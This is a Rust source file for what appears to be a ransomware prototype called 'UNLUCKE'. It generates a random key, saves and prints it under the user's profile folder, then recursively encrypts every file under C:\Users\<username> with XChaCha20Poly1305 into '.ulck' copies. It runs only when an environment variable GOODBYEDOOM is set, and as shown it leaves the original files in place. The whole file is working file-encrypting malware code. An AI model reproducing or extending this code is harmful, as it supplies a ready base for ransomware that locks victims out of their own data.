#![allow(non_snake_case)]

use chacha20poly1305::{
    aead::{stream, KeyInit, OsRng},
    XChaCha20Poly1305,
};
use rand::{distributions::Alphanumeric, RngCore};
use rand::{thread_rng, Rng};
use std::{
    env,
    fs::{self, File},
    io::{self, Read, Write},
    thread,
};

static MAX_FILE_SIZE: u64 = 1000000000;
static COOL_TEXT: &str = r#"  __    __  __    __  __        __    __   ______   __    __  ________
 /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
 $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
 $$ |  $$ |$$$  \$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |/$$/  $$ |__
 $$ |  $$ |$$$$  $$ |$$ |      $$ |  $$ |$$ |      $$  $$<   $$    |
 $$ |  $$ |$$ $$ $$ |$$ |      $$ |  $$ |$$ |   __ $$$$$  \  $$$$$/
 $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
 $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
  $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;

fn runFile(sourceFilePath: &str, key: &str) -> Result<(), io::Error> {
    let metadata = File::open(sourceFilePath)?.metadata()?;
    if metadata.len() == 0 || metadata.len() > MAX_FILE_SIZE {
        return Ok(());
    }

    let destinationFilePath = sourceFilePath.to_owned() + ".ulck";

    let mut nonce = [0u8; 24];
    OsRng.fill_bytes(&mut nonce);

    let aead = XChaCha20Poly1305::new(key.as_bytes().into());
    let mut streamEncryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    const BUFFER_LEN: usize = 500;
    let mut buffer = [0u8; BUFFER_LEN];

    let mut sourceFile = File::open(sourceFilePath)?;
    let mut distFile = File::create(destinationFilePath)?;

    loop {
        let read_count = sourceFile.read(&mut buffer)?;

        if read_count == BUFFER_LEN {
            let ciphertext = streamEncryptor.encrypt_next(buffer.as_slice());

            match ciphertext {
                Ok(ciphertext) => {
                    distFile.write(&ciphertext)?;
                }
                Err(_) => break,
            }
        } else {
            let ciphertext = streamEncryptor.encrypt_last(&buffer[..read_count]);

            match ciphertext {
                Ok(ciphertext) => {
                    distFile.write(&ciphertext)?;
                }
                Err(_) => break,
            }

            break;
        }
    }

    Ok(())
}

fn runDirEntry(dirEntryPath: &str, key: &str) {
    let dirEntry = match File::open(dirEntryPath) {
        Ok(file) => file,
        Err(_) => return,
    };

    let metadata = match dirEntry.metadata() {
        Ok(metadata) => metadata,
        Err(_) => return,
    };

    if metadata.is_dir() {
        let dirEntries = match fs::read_dir(dirEntryPath) {
            Ok(paths) => paths,
            Err(_) => return,
        };

        for dirEntry in dirEntries {
            match dirEntry {
                Ok(dirEntry) => match dirEntry.path().to_str() {
                    Some(path) => runDirEntry(&path, &key),
                    None => (),
                },
                Err(_) => (),
            }
        }
    } else {
        let newDirEntryPath = dirEntryPath.to_owned();
        let newKey = key.to_owned();
        thread::spawn(move || runFile(&newDirEntryPath, &newKey));
    }
}

fn main() {
    println!("\n\n{}\n\n\n", COOL_TEXT);

    match env::var("GOODBYEDOOM") {
        Ok(_) => (),
        Err(_) => panic!("GOODBYEDOOM not set"),
    }

    let username = match env::var("username") {
        Ok(username) => username,
        Err(_) => panic!("No username set"),
    };

    let key: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(64)
        .map(char::from)
        .collect();

    let mut entryPath: String = r#"C:\Users\"#.to_string();
    entryPath.push_str(&username);

    println!("Entry point: {}", entryPath);

    let mut keyPath: String = entryPath.clone();
    keyPath.push_str(r#"\unlucke.key"#);

    println!(r#"Writing key at {}. Key: {}"#, keyPath, key);

    let mut keyFile = File::create(&keyPath).unwrap();
    keyFile.write_all(key.as_bytes()).unwrap();
    let dirEntries = fs::read_dir(&entryPath).unwrap();
    for dirEntry in dirEntries {
        match dirEntry {
            Ok(dirEntry) => match dirEntry.path().to_str() {
                Some(path) => runDirEntry(&path, &key),
                None => (),
            },
            Err(_) => (),
        }
    }
}
